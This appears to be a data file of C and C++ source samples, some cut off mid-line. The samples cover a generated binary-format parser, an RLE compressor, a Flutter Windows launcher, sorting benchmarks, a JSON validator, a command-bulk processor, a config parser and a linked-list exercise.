    "// This is a generated file! Please edit source .ksy file and use kaitai-struct-compiler to rebuild\n\n#include \"column_data_dictionary.h\"\n#include \"kaitai/exceptions.h\"\n\ncolumn_data_dictionary_t::column_data_dictionary_t(kaitai::kstream* p__io, kaitai::kstruct* p__parent, column_data_dictionary_t* p__root) : kaitai::kstruct(p__io) {\n    m__parent = p__parent;\n    m__root = this;\n    m_hash_information = 0;\n\n    try {\n        _read();\n    } catch(...) {\n        _clean_up();\n        throw;\n    }\n}\n\nvoid column_data_dictionary_t::_read() {\n    m_dictionary_type = static_cast<column_data_dictionary_t::dictionary_types_t>(m__io->read_s4le());\n    m_hash_information = new hash_info_t(m__io, this, m__root);\n    n_data = true;\n    switch (dictionary_type()) {\n    case column_data_dictionary_t::DICTIONARY_TYPES_XM_TYPE_STRING: {\n        n_data = false;\n        m_data = new string_data_t(m__io, this, m__root);\n        break;\n    }\n    case column_data_dictionary_t::DICTIONARY_TYPES_XM_TYPE_LONG: {\n        n_data = false;\n        m_data = new number_data_t(m__io, this, m__root);\n        break;\n    }\n    case column_data_dictionary_t::DICTIONARY_TYPES_XM_TYPE_REAL: {\n        n_data = false;\n        m_data = new number_data_t(m__io, this, m__root);\n        break;\n    }\n    }\n}\n\ncolumn_data_dictionary_t::~column_data_dictionary_t() {\n    _clean_up();\n}\n\nvoid column_data_dictionary_t::_clean_up() {\n    if (m_hash_information) {\n        delete m_hash_information; m_hash_information = 0;\n    }\n    if (!n_data) {\n        if (m_data) {\n            delete m_data; m_data = 0;\n        }\n    }\n}\n\ncolumn_data_dictionary_t::string_record_handle_t::string_record_handle_t(kaitai::kstream* p__io, column_data_dictionary_t::dictionary_record_handles_vector_t* p__parent, column_data_dictionary_t* p__root) : kaitai::kstruct(p__io) {\n    m__parent = p__parent;\n    m__root = p__root;\n\n    try {\n        _read();\n    } catch(...) {\n        _clean_up();\n        throw;\n    }\n}\n\nvoid column_data_dictionary_t::string_record_handle_t::_read() {\n    m_bit_or_byte_offset = m__io->read_u4le();\n    m_page_id = m__io->read_u4le();\n}\n\ncolumn_data_dictionary_t::string_record_handle_t::~string_record_handle_t() {\n    _clean_up();\n}\n\nvoid column_data_dictionary_t::string_record_handle_t::_clean_up() {\n}\n\ncolumn_data_dictionary_t::string_data_t::string_data_t(kaitai::kstream* p__io, column_data_dictionary_t* p__parent, column_data_dictionary_t* p__root) : kaitai::kstruct(p__io) {\n    m__parent = p__parent;\n    m__root = p__root;\n    m_page_layout_information = 0;\n    m_dictionary_pages = 0;\n    m_dictionary_record_handles_vector_info = 0;\n\n    try {\n        _read();\n    } catch(...) {\n        _clean_up();\n        throw;\n    }\n}\n\nvoid column_data_dictionary_t::string_data_t::_read() {\n    m_page_layout_information = new page_layout_t(m__io, this, m__root);\n    m_dictionary_pages = new std::vector<dictionary_page_t*>();\n    const int l_dictionary_pages = page_layout_information()->store_page_count();\n    for (int i = 0; i < l_dictionary_pages; i++) {\n        m_dictionary_pages->push_back(new dictionary_page_t(m__io, this, m__root));\n    }\n    m_dictionary_record_handles_vector_info = new dictionary_record_handles_vector_t(m__io, this, m__root);\n}\n\ncolumn_data_dictionary_t::string_data_t::~string_data_t() {\n    _clean_up();\n}\n\nvoid column_data_dictionary_t::string_data_t::_clean_up() {\n    if (m_page_layout_information) {\n        delete m_page_layout_information; m_page_layout_information = 0;\n    }\n    if (m_dictionary_pages) {\n        for (std::vector<dictionary_page_t*>::iterator it = m_dictionary_pages->begin(); it != m_dictionary_pages->end(); ++it) {\n            delete *it;\n        }\n        delete m_dictionary_pages; m_dictionary_pages = 0;\n    }\n    if (m_dictionary_record_handles_vector_info) {\n        delete m_dictionary_record_handles_vector_info; m_dictionary_record_handles_vector_info = 0;\n    }\n}\n\ncolumn_data_dictionary_t::hash_info_t::hash_info_t(kaitai::kstream* p__io, column_data_dictionary_t* p__parent, column_data_dictionary_t* p__root) : kaitai::kstruct(p__io) {\n    m__parent = p__parent;\n    m__root = p__root;\n    m_hash_elements = 0;\n\n    try {\n        _read();\n    } catch(...) {\n        _clean_up();\n        throw;\n    }\n}\n\nvoid column_data_dictionary_t::hash_info_t::_read() {\n    m_hash_elements = new std::vector<int32_t>();\n    const int l_hash_elements = 6;\n    for (int i = 0; i < l_hash_elements; i++) {\n        m_hash_elements->push_back(m__io->read_s4le());\n    }\n}\n\ncolumn_data_dictionary_t::hash_info_t::~hash_info_t() {\n    _clean_up();\n}\n\nvoid column_data_dictionary_t::hash_info_t::_clean_up() {\n    if (m_hash_elements) {\n        delete m_hash_elements; m_hash_elements = 0;\n    }\n}\n\ncolumn_data_dictionary_t::vector_of_vectors_t::vector_of_vectors_t(kaitai::kstream* p__io, column_data_dictionary_t::number_data_t* p__parent, column_data_dictionary_t* p__root) : kaitai::kstruct(p__io) {\n    m__parent = p__parent;\n    m__root = p__root;",
    "#include \"rle.h\"\n\nfloat compress(std::basic_string<char> fname, std::basic_string<char> cname) {\n    std::fstream file;            // original file\n    std::fstream compressed;      // compressed file\n    char character;          // \u0447\u0438\u0442\u0430\u0435\u043c\u044b\u0439 \u0441\u0438\u043c\u0432\u043e\u043b\n    char next_character;     // \u0441\u043b\u0435\u0434\u0443\u044e\u0449\u0438\u0439 \u0447\u0438\u0442\u0430\u0435\u043c\u044b\u0439 \u0441\u0438\u043c\u0432\u043e\u043b\n    int fsize = 0;           // \u0440\u0430\u0437\u043c\u0435\u0440 \u0444\u0430\u0439\u043b\u0430\n    int frequency = 1;       // \u0443\u043d\u0438\u043a\u0430\u043b\u044c\u043d\u043e\u0441\u0442\u044c \u0441\u0438\u043c\u0432\u043e\u043b\u043e\u0432\n    int write_pos = 0;\n\n    file.open(fname, std::ios::in | std::ios::ate | std::ios::binary);\n    compressed.open(cname, std::ios::out | std::ios::trunc | std::ios::binary);\n    fsize = file.tellg();\n\n    for(int i = 0; i < fsize; i++)\n    {\n        file.seekg(i, std::ios::beg);      // safety net\n        file.read((char*)&character, sizeof(char)); // \u043f\u043e\u043b\u0443\u0447\u0438\u0442\u044c \u0442\u0435\u043a\u0443\u0449\u0438\u0439 \u0441\u0438\u043c\u0432\u043e\u043b\n        next_character = file.peek();\n\n        if(next_character != character)\n        {\n            compressed.seekp(write_pos, std::ios::beg);\n            compressed.write((char*)&frequency, sizeof(char));\n            compressed.seekp(write_pos + 1, std::ios::beg);\n            compressed.write((char*)&character, sizeof(char));\n            write_pos += 2;\n            frequency = 0;\n        }\n        frequency++;\n    }\n\n    file.close();\n    compressed.close();\n\n    return (write_pos / float(fsize));\n}\n\nvoid decompress(std::basic_string<char> fname, const std::basic_string<char> uname) {\n    std::fstream file;\n    std::fstream ufile;\n    char character;\n    int frequency = 0;\n    int fsize = 0;\n    int write_pos = 0;\n\n    file.open(fname, std::ios::ate | std::ios::in | std::ios::binary);\n    ufile.open(uname, std::ios::trunc | std::ios::out | std::ios::binary);\n    fsize = file.tellg();\n\n    for(int i = 0; i < fsize; i += 2)\n    {\n        file.seekg(i, std::ios::beg);\n        file.read((char*)&frequency, sizeof(char));\n        file.seekg(i + 1, std::ios::beg);\n        file.read((char*)&character, sizeof(char));\n\n        for(int j = 0; j < frequency; j++)\n        {\n            ufile.seekp(write_pos, std::ios::beg);\n            ufile.write((char*)&character, sizeof(char));\n            write_pos++;\n        }\n    }\n    file.close();\n    ufile.close();\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"currency_converter\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <cstdlib>\n#include <ctime>\n#include <vector>\n#include <algorithm>\nusing std::cout;\nusing std::endl;\nusing std::swap;\nusing std::sort;\n\nusing std::clock_t;\nconst int CLOCKS_PER_MS = CLOCKS_PER_SEC/1000; // clock per milliseconds\n\nconst int NUMBERS_SIZE = 50000;\n\n// random number in range -> for test code\nint genRandInt(int low, int high) {\n   return low + rand() % (high - low + 1);\n}\n\n// fill arrays -> for test code\nvoid fillArrays(int arr1[], int arr2[],int arr3[]) {\n  for(int i = 0; i < NUMBERS_SIZE; ++i){\n    arr1[i] = genRandInt(0,NUMBERS_SIZE);\n    arr2[i] = arr1[i];\n    arr3[i] = arr1[i];\n  }\n}\n\n// helper for quicksorts\nint QPartition(int numbers[], int low, int high, int pivotIndex) {\n  int pivot = numbers[pivotIndex];\n  while (true) {  // continuously loops until fin is true\n    // until reaches element left of pivot that is greater than pivot value\n    while (numbers[low] < pivot) { ++low; }\n    // until reaches element right of pivot that is less than pivot value\n    while (pivot < numbers[high]) { --high; }\n    if (low >= high) break;  // checks if there are unsorted elements\n    // if continues, low index is still less than high index\n    swap(numbers[low], numbers[high]);\n    ++low;\n    --high;\n  }\n  return high;\n}\n\n// sorts given array in range using quicksort method, recursive\nvoid Quicksort_midpoint(int numbers[], int low, int high) {\n  if (low >= high) return;  // already sorted\n  int mid = (high - low) / 2 + low;\n  mid = QPartition(numbers, low, high, mid);  // call helper\n  Quicksort_midpoint(numbers, low, mid);  // left half recursive call\n  Quicksort_midpoint(numbers, mid + 1, high); // right half recursive call\n}\n\n// sort given array in range using quicksort method, but chooses pivot by\n// choosing middle value of low, middle, and high indexes, recursive\nvoid Quicksort_medianOfThree(int numbers[], int low, int high) {\n  if (low >= high) return;  // already sorted\n  int mid = (high - low) / 2 + low;\n  int pivot = mid;  // element at mid is pivot by default\n  // element at lowest index is middle value\n  if ((numbers[mid] < numbers[low] && numbers[low] < numbers[high]) ||\n      (numbers[high] < numbers[low] && numbers[low] < numbers[mid])) pivot = low;\n  // element at highest index is middle value\n  if ((numbers[mid] < numbers[high] && numbers[high] < numbers[low]) ||\n      (numbers[low] < numbers[high] && numbers[high] < numbers[mid])) pivot = high;\n  mid = QPartition(numbers, low, high, pivot);  // call helper\n  Quicksort_medianOfThree(numbers, low, mid); // left half recursive call\n  Quicksort_medianOfThree(numbers, mid + 1, high);  // right half recursive call\n}\n\n// sorts given array using insertion sort method\nvoid InsertionSort(int numbers[], int numbersSize) {\n  for (int i = 1; i < numbersSize; ++i) { // sorts every element in array\n    int j = i;\n    // shifts element left to correct spot\n    while (j > 0 && numbers[j] < numbers[j - 1]) {\n      swap(numbers[j], numbers[j - 1]);\n      --j;\n    }\n  }\n}\n\n// helper, returns true if sorted, else false\nstatic bool is_sorted(int numbers[], int numbersSize) {\n  if (numbersSize <= 0) return true;  // will be sorted if empty\n  int last = numbers[0];\n  for(int i=0; i < numbersSize; ++i) {  // checks all elements\n    int curr = numbers[i];\n    if (curr < last) return false;  // prev value is greater than curr -> not sorted properly\n    last = curr;\n  }\n  return true;\n}\n\n// put vector in array after randomizing in main\nstatic void copy_vector_into_array(const std::vector<int>& source, int array[]) {\n  for(int i=0;i<static_cast<int>(source.size()); ++i) { // iterate through vector\n    array[i] = source[i];\n  }\n}\n\nint main() {\n  std::vector<int> sample;\n  sample.reserve(NUMBERS_SIZE);\n  // randomize array\n  for(int i=0; i<NUMBERS_SIZE; ++i) {\n    sample.push_back(rand() % (NUMBERS_SIZE + 1));\n  }\n  \n  // run tests across different sizes\n  int test_sizes[4] = { 10, 100, 1000, 50000 };\n  int test_array[NUMBERS_SIZE];\n  for(int i=0; i<4; ++i) {  // loops for four different sizes\n    int size = test_sizes[i];\n    cout << endl;\n    cout << \"-------------------- size \" << size << \" --------------------\" << endl;\n\n    {\n      copy_vector_into_array(sample, test_array);\n      clock_t Start = clock();\n      Quicksort_midpoint(test_array, 0, size - 1);\n      clock_t End = clock();\n      int elapsedTime = (End - Start)/CLOCKS_PER_MS;\n      cout << elapsedTime << \" ms\" << endl;\n      cout << \"Quicksort midpoint is \" << ((is_sorted(test_array,size))?\"GOOD\":\"BAD\") << endl;\n    }\n    \n    // QUICKSORT MEDIAN OF THREE SORT\n    {\n      copy_vector_into_array(sample, test_array);\n      clock_t Start = clock();\n      Quicksort_medianOfThree(test_array, 0, size - 1);\n      clock_t End = clock();\n      int elapsedTime = (End - Start)/CLOCKS_PER_MS;\n      cout << elapsedTime << \" ms\" << endl;\n      cout << \"Quicksort median of three is \" << ((is_sorted(test_array,size))?\"GOOD\":\"BAD\") << endl;\n    }\n    \n    // INSERTION SORT\n    {\n      co",
    "//  ---                  JSON validator                      ---\n//  ---  Este programa recibe un archivo .json de entrada.   ---\n//  ---  Verifica que est\u00e9 bien escrito el formato JSON.     ---\n//  ---  En caso de un error, imprime en cosola.             ---\n//  ---  Si es correcto crea dos archivos de salida.         ---\n//  ------------------------------------------------------------\n\n#include <iostream>\n#include <fstream>\n#include <stack>\n#include <queue>\n#include <string>\n\nusing namespace std;\n\nconst string NOMBRE_ARCHIVO_ENTRADA = \"entrada.json\";\n\nenum ModoAnalisis\n{\n    JSON,\n    LLAVE,\n    VALOR,\n    LISTA\n};\n\nclass ExpresionJSON\n{\nprivate:\n    stack<char> pila;\n    string buffers;\n\npublic:\n    void evaluarCaracter(char c, char nc, ModoAnalisis &modo, string buffer);\n    void imprimir(ofstream &archivoSalida) const;\n};\n\nclass ExpresionValor\n{\nprivate:\n    stack<char> pila;\n    string buffers;\n\npublic:\n    void evaluarCaracter(char c, char nc, ModoAnalisis &modo, string buffer);\n    void imprimir(ofstream &archivoSalida) const;\n};\n\nclass ExpresionLlave\n{\nprivate:\n    stack<char> pila;\n    string buffers;\n\npublic:\n    void evaluarCaracter(char c, char nc, ModoAnalisis &modo, string buffer);\n    void imprimir(ofstream &archivoSalida) const;\n};\n\nclass ExpresionLista\n{\nprivate:\n    stack<char> pila;\n    string buffers;\n\npublic:\n    void evaluarCaracter(char c, char nc, ModoAnalisis &modo, string buffer);\n    void imprimir(ofstream &archivoSalida) const;\n};\n\nvoid procesarArchivo(const string &nombreArchivo, const string &nombreArchivoSalida, const string &nombreBuffers, ExpresionJSON &expresionJSON, ExpresionValor &expresionValor, ExpresionLlave &expresionLlave, ExpresionLista &expresionLista);\n\nint main()\n{\n    string archivoEntrada = NOMBRE_ARCHIVO_ENTRADA;\n    string archivoSalida = \"salida.json\";\n    string buffers = \"buffers.txt\";\n\n    ExpresionJSON expresionJSON;\n    ExpresionValor expresionValor;\n    ExpresionLlave expresionLlave;\n    ExpresionLista expresionLista;\n\n    procesarArchivo(archivoEntrada, archivoSalida, buffers, expresionJSON, expresionValor, expresionLlave, expresionLista);\n\n    return 0;\n}\n\nvoid procesarArchivo(const string &nombreArchivo, const string &nombreArchivoSalida, const string &nombreBuffers, ExpresionJSON &expresionJSON, ExpresionValor &expresionValor, ExpresionLlave &expresionLlave, ExpresionLista &expresionLista)\n{\n    ifstream archivo(nombreArchivo);\n    ofstream archivoSalida(nombreArchivoSalida);\n    ofstream buffers(nombreBuffers);\n\n    if (!archivo)\n    {\n        cout << \"No se pudo abrir el archivo de entrada: \" << nombreArchivo << endl;\n        return;\n    }\n\n    cout << \"Se pudo abrir el archivo de entrada: \" << nombreArchivo << endl\n         << endl;\n\n    char c;\n    char nc;\n    string buffer; // Buffer global para almacenar los caracteres\n    ModoAnalisis modo = JSON;\n\n    while (archivo.get(c))\n    {\n        if (!isspace(c)) // omitir espacios\n        {\n            buffer += c;\n            while (isspace(archivo.peek()))\n            {\n                archivo.get(nc);\n            }\n            nc = archivo.peek(); // obtener el siguiente caracter sin ser un espacio\n            switch (modo)\n            {\n            case JSON:\n                expresionJSON.evaluarCaracter(c, nc, modo, buffer);\n                break;\n            case VALOR:\n                expresionValor.evaluarCaracter(c, nc, modo, buffer);\n                break;\n            case LISTA:\n                expresionLista.evaluarCaracter(c, nc, modo, buffer);\n                break;\n            case LLAVE:\n                expresionLlave.evaluarCaracter(c, nc, modo, buffer);\n                break;\n            }\n        }\n    }\n\n    expresionJSON.imprimir(buffers);\n    expresionValor.imprimir(buffers);\n    expresionLista.imprimir(buffers);\n    expresionLlave.imprimir(buffers);\n\n    archivoSalida << buffer; // Imprimir el buffer en el archivo de salida\n    archivoSalida.close();\n    archivo.close();\n    cout << \"Archivo JSON verificado con exito!\" << endl;\n}\n\nvoid ExpresionJSON::evaluarCaracter(char c, char nc, ModoAnalisis &modo, string buffer)\n{\n    if (pila.empty())\n    {\n        if (c == '{')\n        {\n            pila.push(c);\n            buffers += c;\n            modo = LLAVE;\n        }\n        else\n        {\n            cout << \"Error JSON: Car\u00e1cter inesperado antes de la apertura de llaves. El caracter erroneo fue: \" << c << endl;\n            cout << buffer << endl;\n            exit(1);\n        }\n    }\n    else\n    {\n        if (c == ',')\n        {\n            buffers += c;\n            if (nc == '\"')\n            {\n                modo = LLAVE;\n            }\n        }\n        else if (c == '{') // varias anidaciones\n        {\n            pila.push(c);\n            buffers += c;\n            modo = LLAVE;\n        }\n        else if (c == '}')\n        {\n            pila.pop();\n            buffers += c;\n        }\n        else\n        {\n            cout << \"Error JSON: Car\u00e1cter inesperado, se espera un",
    "/// @brief This module contains command processing\r\n/// and the main function\r\n\r\n#include \"model.h\"\r\n#include \"inout.h\"\r\n#include <utility>\r\n#include <stack>\r\n\r\n/// @brief A type for lexemas: Enum + string\r\nusing lexema_t = std::pair<enum Lex, std::string>;\r\n\r\n/// @brief The command stack\r\n/// is used here for convenient creation and deletion of command blocks\r\n/// stack depth is <= 1\r\nusing bulks_t = std::stack<bulk_t>;\r\n\r\n/// @brief Global variable for size of \"static\" bulks\r\nint bulk_size = 0;\r\n\r\n/// @brief Returns next lexema from input\r\n/// @return std::pair<enum Lex, std::string>\r\nlexema_t next_lexema()\r\n{\r\n    std::string buf;\r\n\r\n    c_get_line(buf);\r\n\r\n    if (c_eof())\r\n        return std::make_pair(EndOfInput, std::string(\"\"));\r\n    if (buf.find('{') != buf.npos)\r\n        return std::make_pair(OpenBr, std::string(\"{\"));\r\n    if (buf.find('}') != buf.npos)\r\n        return std::make_pair(CloseBr, std::string(\"}\"));\r\n    return std::make_pair(Cmd, buf);\r\n}\r\n\r\n/// @brief The main automate to process commands\r\n/// @param bulks - one level stack of command bulks\r\nvoid proceed(bulks_t &bulks)\r\n{\r\n    // Set initial state\r\n    bulks.push(bulk_t(clock(), StartOfStatic, bulk_size));\r\n    int is_dynamic = 0;\r\n\r\n    while (true)\r\n    {\r\n        auto lexema = next_lexema();\r\n        int lexlex = lexema.first; // first: lexema enum,\r\n                                   // second: command string, if any, or \"\"\r\n\r\n        switch (lexlex)\r\n        {\r\n        case OpenBr:          // '{'\r\n            if (is_dynamic++) // nested '{' are only accounted\r\n                break;\r\n            output_bulk(bulks.top());\r\n\r\n            // destroys the old cmd bulk\r\n            bulks.pop();\r\n\r\n            // Creates & constructs new cmd bulk header\r\n            bulks.push(bulk_t(clock(), OpenBr, 0));\r\n            break;\r\n        case CloseBr:         // '}'\r\n            if (--is_dynamic) // checks for nesting level\r\n                break;\r\n            output_bulk(bulks.top());\r\n            bulks.pop();\r\n            bulks.push(bulk_t(clock(), StartOfStatic, bulk_size));\r\n            break;\r\n        case Cmd: // command\r\n            bulks.top().cmds.emplace_back(lexema.second);\r\n\r\n            // for dynamic bulks target_size is 0, for static ones - is equal to bulk_size\r\n            if (bulks.top().cmds.size() == bulks.top().target_size)\r\n            {\r\n                output_bulk(bulks.top());\r\n                bulks.pop();\r\n                bulks.push(bulk_t(clock(), StartOfStatic, bulk_size));\r\n            }\r\n            break;\r\n        case EndOfInput: // ^D\r\n            if (bulks.top().lex == OpenBr)\r\n                return;\r\n            output_bulk(bulks.top());\r\n            return;\r\n        };\r\n    }\r\n}\r\n\r\n/// @brief Just a main proc\r\n/// @param argc is not used, because the param number is known to be 1\r\n/// @param argv nof commands in a bulk, is stored into a global var bulk_size\r\n/// @return zero\r\nint main([[maybe_unused]] int argc, char *argv[])\r\n{\r\n    bulks_t bulks;\r\n    bulk_size = std::atoi(argv[1]);\r\n    proceed(bulks);\r\n    return 0;\r\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <fcntl.h>\n#include <errno.h>\n#include <iostream>\n#include <list>\n#include <string>\n#include <limits>\n#include <cfloat>\n#include <dirent.h>\n#include \"traceReplay.h\"\n#include \"cJSON.h\"\n\nstatic int trace_replay(char *config_name, int day);\nstatic int parse_multimedia(cJSON *multi_obj, struct Config *config);\nstatic int parse_basic_app(cJSON *basic_obj, struct Config *config);\nstatic int parse_normal_app(cJSON *normal_obj, struct Config *config);\nstatic int parse_apps(cJSON *apps_obj, struct App *apps, \n\t\t\tdouble default_update, double default_loading, double default_bg);\nstatic int parse_ps_name(cJSON *ps_name_obj, struct Config *config);\nstatic int parse_fulldisk(cJSON *ps_full_obj, struct Config *config);\nstatic double parse_time(string line);\n\n\nint parse_config(char *config_name, struct Config *config)\n{\n\tFILE *config_fp;\n\tlong len = 0;\n\tchar *config_data;\n\tint ret = 0;\n\tcJSON *root_obj;\n\tcJSON *mount_dir_obj;\n\tcJSON *init_filemap_obj;\n\tcJSON *backup_path_obj;\n\tcJSON *multimedia_obj;\n\tcJSON *basic_app_obj;\n\tcJSON *normal_app_obj;\n\tcJSON *ps_name_obj;\n\tcJSON *ps_full_obj;\n\n\tconfig_fp = fopen(config_name, \"r\");\n\tif (config_fp == NULL) {\n\t\tprintf(\"error: cannot read %s\\n\", config_name);\n\t\tret = -1;\n\t\treturn -1;\n\t}\n\t\n\tfseek(config_fp, 0, SEEK_END);\n\tlen = ftell(config_fp);\n\tfseek(config_fp, 0, SEEK_SET);\n\n\tconfig_data = (char *)malloc(len);\n\tif (config_data == NULL) {\n\t\tprintf(\"error: failed malloc\\n\");\n\t\tfclose(config_fp);\n\t\treturn -1;\n\t}\n\tfread(config_data, sizeof(char), len, config_fp);\n\n\troot_obj = cJSON_Parse(config_data);\n\tif (root_obj == NULL) {\n\t\tprintf(\"error: %s\\n\", cJSON_GetErrorPtr());\n\t\tret = -1;\n\t\tgoto out;\n\t}\n\n\t// MOUNT_DIR\n\tmemset(config->mount_dir, 0, PATH_MAX);\n\tmount_dir_obj = cJSON_GetObjectItem(root_obj, \"MOUNT_DIR\");\n\tif (mount_dir_obj == NULL) {\n\t\tsprintf(config->mount_dir, \"data\");\n\t} else {\n\t\tsprintf(config->mount_dir, \"%s\", mount_dir_obj->valuestring);\n\t}\n\n\t// INIT_FILEMAP\n\tmemset(config->INIT_FILEMAP, 0, PATH_MAX);\n\tinit_filemap_obj = cJSON_GetObjectItem(root_obj, \"INIT_FILEMAP\");\n\tif (init_filemap_obj == NULL) {\n\t\tsprintf(config->INIT_FILEMAP, \"NULL\");\n\t} else {\n\t\tsprintf(config->INIT_FILEMAP, \"%s\", init_filemap_obj->valuestring);\n\t}\n\n\t// BACKUP_PATH\n\tmemset(config->backup_path, 0, PATH_MAX);\n\tbackup_path_obj = cJSON_GetObjectItem(root_obj, \"BACKUP_PATH\");\n\tif (backup_path_obj == NULL) {\n\t\tsprintf(config->backup_path, \"trace-bak\");\n\t} else {\n\t\tsprintf(config->backup_path, \"%s\", backup_path_obj->valuestring);\n\t}\n\n\t// MULTIMEDIA\n\tmultimedia_obj = cJSON_GetObjectItem(root_obj, \"MULTIMEDIA\");\n\tif (multimedia_obj == NULL) {\n\t\tprintf(\"error: Parse JSON file, No MULTIMEDIA\\n\");\n\t\tret = -1;\n\t\tgoto out;\n\t} else {\n\t\tret = parse_multimedia(multimedia_obj, config);\n\t\tif (ret == -1)\n\t\t\tgoto out;\n\t}\n\n\tbasic_app_obj = cJSON_GetObjectItem(root_obj, \"BASIC_APP\");\n\tif (basic_app_obj == NULL) {\n\t\tprintf(\"error: Parse JSON file, No BASIC_APP\\n\");\n\t\tret = -1;\n\t\tgoto out;\n\t} else {\n\t\tret = parse_basic_app(basic_app_obj, config);\n\t\tif (ret == -1)\n\t\t\tgoto out;\n\t}\n\n\tnormal_app_obj = cJSON_GetObjectItem(root_obj, \"NORMAL_APP\");\n\tif (normal_app_obj == NULL) {\n\t\tprintf(\"error: Parse JSON file, No NORMAL_APP\\n\");\n\t\tret = -1;\n\t\tgoto out;\n\t} else {\n\t\tret = parse_normal_app(normal_app_obj, config);\n\t\tif (ret == -1)\n\t\t\tgoto out;\n\t}\n\n\tps_name_obj = cJSON_GetObjectItem(root_obj, \"PROCESS\");\n\tif (ps_name_obj == NULL) {\n\t\tprintf(\"warning: Failed Parse JSON file, No PROCESS\\n\");\n\t\tret = 0;\n\t\tgoto out;\n\t} else {\n\t\tret = parse_ps_name(ps_name_obj, config);\n\t\tif (ret == -1)\n\t\t\tgoto out;\n\t}\n\n\tps_full_obj = cJSON_GetObjectItem(root_obj, \"FULLDISK\");\n\tif (ps_full_obj == NULL) {\n\t\tprintf(\"error: Failed Parse JSON file, No FULLDISK\\n\");\n\t\tret = -1;\n\t\tgoto out;\n\t} else {\n\t\tret = parse_fulldisk(ps_full_obj, config);\n\t\tif (ret == -1)\n\t\t\tgoto out;\n\t}\n\nout:\n\tfclose(config_fp);\n\tfree(config_data);\n\treturn ret;\n}\n\nstatic int parse_multimedia(cJSON *multi_obj, struct Config *config)\n{\n\tcJSON *camera_obj;\n\tcJSON *others_obj;\n\tcJSON *camera_path_obj;\n\tcJSON *camera_multipath_obj;\n\tcJSON *camera_takecount_obj;\n\tcJSON *camera_deletecount_obj;\n\tcJSON *camera_initcount_obj;\n\tcJSON *camera_sizeunit_obj;\n\tcJSON *camera_minsize_obj;\n\tcJSON *camera_maxsize_obj;\n\tunsigned long unit;\n\n\tcamera_obj = cJSON_GetObjectItem(multi_obj, \"CAMERA\");\n\tif (camera_obj == NULL) {\n\t\tprintf(\"error: No exist CAMERA in MULTIMEDIA\");\n\t\treturn -1;\n\t}\n\n\tconfig->multi.mul_camera.name = string(\"camera\");\n\tcamera_multipath_obj = cJSON_GetObjectItem(camera_obj, \"MULTIMEDIA_PATH\");\n\tif (camera_multipath_obj == NULL) {\n\t\tprintf(\"error: No exist MULTIMEDIA_PATH in CAMERA\");\n\t\treturn -1;\n\t}\n\tconfig->multi.mul_camera.multimedia_path = string(camera_multipath_obj->valuestring);\n\n\tcamera_takecount_obj = cJSON_GetObjectItem(camera_obj, \"TAKE_COUNT\");\n\tif (camera_takecount_obj == NULL) {\n\t\tprintf(\"error: No exist TAKE_COUNT in CAMERA\");\n\t\treturn -1;\n\t}\n\tconfig->multi.mul_camera.take_count = came",
    "#include <iostream>\nusing namespace std;\nstruct node\n{\n\tint data;\n\tnode* next;\n};\n\nnode* head = NULL;\nnode* current = NULL;\nnode* tail = NULL;\n\nvoid insert(int newdata)\n{\n\tcurrent = new node;\n\tcurrent->data = newdata;\n\tcurrent->next = NULL;\n\n\tif (head == NULL)\n\t{\n\t\thead = current;\n\t\ttail = current;\n\t}\n\telse\n\t{\n\t\ttail->next = current;\n\t\ttail = tail->next;\n\t}\n}\nvoid AddToHead(int newdata)\n{\n\tcurrent = new node;\n\tcurrent->data = newdata;\n\tcurrent->next = NULL;\n\tif (head == NULL)\n\t{\n\t\thead = current;\n\t\ttail = current;\n\t}\n\telse\n\t{\n\t\tcurrent->next = head;\n\t\thead = current;\n\t}\n}\nvoid deleteNode(int Deldata) {\n\tif (head != NULL)\n\t{\n\t\tcurrent = head;\n\t\tif (current->data == Deldata)\n\t\t{\n\t\t\thead = head->next;\n\t\t\tdelete current;\n\t\t}\n\t\telse\n\t\t{\n\t\t\twhile (current != NULL)\n\t\t\t{\n\t\t\t\tif ((current->next)->data == Deldata)\n\t\t\t\t{\n\t\t\t\t\t(current->next) = (current->next)->next;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\telse { current = current->next; }\n\t\t\t}\n\t\t}\n\t}\n\telse { cout << \"No Data Found\" << endl; }\n}\nvoid destoryList()\n{\n\tif (head != NULL)\n\t{\n\t\tcurrent = head;\n\t\twhile (current != NULL)\n\t\t{\n\t\t\thead = head->next;\n\t\t\tdelete current;\n\t\t\tcurrent = head;\n\t\t}\n\t\thead = NULL;\n\t\ttail = NULL;\n\t\tcout << \"The list is Destroyed Successfully\" << endl;\n\t}\n\telse\n\t{ cout << \"There is no list to be destroyed\" << endl; }\n}\nvoid display()\n{\n\tif (head != NULL)\n\t{\n\t\tcurrent = head;\n\t\tcout << \"Data:\" << endl;\n\t\twhile (current != NULL)\n\t\t{\n\t\t\tcout << current->data << endl;\n\t\t\tcurrent = current->next;\n\t\t}\n\t}\n\telse\n\t{ cout << \"No Data Found\" << endl; }\n}\n\nvoid app() {\n\t/*\n\t\top -> operation\n\t\tath -> add to head\n\t\tdn -> deleted node\n\t\tc -> confirm\n\t\tao -> another operation\n\t\ts -> starter app\n\t*/\n\tint op, ath, dn, c, ao, s;\n\n\tcout << \"--- Welcome to linked list implementation---\\n\";\n\tdo {\n\t\tcout << \"Choise what do you want\\n\";\n\t\tcout << 